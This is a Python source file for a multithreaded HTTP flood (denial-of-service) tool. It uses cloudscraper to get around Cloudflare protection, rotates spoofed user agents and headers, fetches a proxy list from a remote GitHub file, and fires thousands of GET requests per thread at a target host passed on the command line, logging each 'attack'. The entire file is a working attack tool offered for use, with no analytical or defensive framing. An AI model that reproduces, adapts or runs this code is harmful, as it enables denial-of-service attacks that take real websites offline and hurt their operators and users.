import cloudscraper
import os
from urllib.parse import unquote
from gc import collect
from loguru import logger
from os import system
from sys import stderr
from threading import Thread
from random import choice
from time import sleep
from urllib3 import disable_warnings
from pyuseragents import random as random_useragent
from json import loads
from argparse import ArgumentParser
import platform

import json
import sys

VERSION = 6
PROXY_SOURCE = 'https://raw.githubusercontent.com/opengs/uashieldtargets/master/proxy.json'
HOSTS = []
MAX_REQUESTS = 5000
SUPPORTED_PLATFORMS = {
    'linux': 'Linux'
}

disable_warnings()

logger.remove()
logger.add(
    stderr, format="<white>{time:HH:mm:ss}</white> | <level>{level: <8}</level> | <cyan>{line}</cyan> - <white>{message}</white>")
threads = int(sys.argv[1])

parser = ArgumentParser()
parser.add_argument("-v", "--verbose", dest="verbose", action='store_true')
parser.add_argument("-n", "--no-clear", dest="no_clear", action='store_true')
parser.add_argument('--host', type=str, required=True)
parser.set_defaults(verbose=True)
parser.set_defaults(no_clear=False)
args, unknown = parser.parse_known_args()
verbose = args.verbose
no_clear = args.no_clear

def checkReq():
    try: os.system("python3 -m pip install -r requirements.txt")
    except: pass
    try: os.system("python -m pip install -r requirements.txt")
    except: pass
    try: os.system("pip install -r requirements.txt")
    except: pass
    try: os.system("pip3 install -r requirements.txt")
    except: pass


def mainth():
    scraper = cloudscraper.create_scraper(
        browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
    scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive',
                           'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})

    while True:
        scraper = cloudscraper.create_scraper(
            browser={'browser': 'firefox', 'platform': 'android', 'mobile': True},)
        scraper.headers.update({'Content-Type': 'application/json', 'cf-visitor': 'https', 'User-Agent': random_useragent(), 'Connection': 'keep-alive',
                               'Accept': 'application/json, text/plain, */*', 'Accept-Language': 'ru', 'x-forwarded-proto': 'https', 'Accept-Encoding': 'gzip, deflate, br'})
        logger.info("GET RESOURCES FOR ATTACK")

        # Hardcoded site
        site = args.host
        logger.info("STARTING ATTACK TO " + site)
        attacks_number = 0

        try:

            print('Atacking', end ='')

            attack = scraper.get(site)

            if attack.status_code >= 302:
                for proxy in HOSTS:
                    scraper.proxies.update(
                        {'http': f'{proxy["ip"]}://{proxy["auth"]}', 'https': f'{proxy["ip"]}://{proxy["auth"]}'})
                    response = scraper.get(site)
                    if response.status_code >= 200 and response.status_code <= 302:
                        for i in range(MAX_REQUESTS):
                            response = scraper.get(site)
                            attacks_number += 1
                            if verbose:
                              logger.info("ATTACKED; RESPONSE CODE: " +
                                          str(response.status_code))
                            else:
                              print('.', end ='')
            else:
                for i in range(MAX_REQUESTS):
                    response = scraper.get(site)
                    attacks_number += 1
                    if verbose:
                      logger.info("ATTACKED; RESPONSE CODE: " +
                                  str(response.status_code))
                    else:
                      print('.', end ='')
            if attacks_number > 0:
              logger.info("SUCCESSFUL ATTACKS: " + str(attacks_number))
        except Exception as e:
            logger.warning("issue happened, SUCCESSFUL ATTACKS: " + str(attacks_number))
            logger.warning(e)
            continue


def scrap_json():
    scraper = cloudscraper.create_scraper(browser={'browser': 'firefox', 'platform': 'android', 'mobile': True}, )
    content = scraper.get(PROXY_SOURCE).content
    if content:
        try:
            data = json.loads(content)
            return data
        except json.decoder.JSONDecodeError:
            raise Exception('Host {} has invalid format'.format(host))
        except Exception:
            raise Exception('Unexpected error. Host {}'.format(host))
    else:
        raise Exception('Unexpected error. Host {}'.format(host))


if __name__ == '__main__':
    HOSTS = scrap_json()
    for _ in range(threads):
        Thread(target=mainth).start()